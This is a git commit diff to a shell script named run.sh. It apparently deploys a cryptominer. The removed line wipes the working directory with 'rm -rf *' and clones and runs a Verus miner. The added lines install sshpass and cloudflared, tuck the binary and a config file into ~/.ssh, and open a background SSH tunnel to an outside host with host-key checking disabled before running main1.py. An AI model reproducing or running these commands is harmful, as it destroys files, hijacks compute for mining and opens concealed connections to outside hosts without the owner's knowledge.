4004fbcd0ade903d35a39c806a6cb08e01c9b468
gahalusinta4 <gahalusinta@gmail.com>
2024-09-29 00:27:51 +0800

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,1 +1,8 @@
-rm -rf * && git clone https://github.com/ilhamadi8/verusminer.git && mv ./verusminer/* ./ && python3 main.py
+apt update
+apt install tmux sshpass -y
+wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 && mv cloudflared-linux-amd64 cloudflared && chmod +x cloudflared 
+mkdir ~/.ssh
+cp ./cloudflared ~/.ssh/ 
+cp ./config ~/.ssh/
+tmux new-session -d -s ses sshpass -p ' ' ssh -o StrictHostKeyChecking=no -L 3000:159.223.144.160:4435 ms@proxy1.adi999.my.id
+python3 main1.py
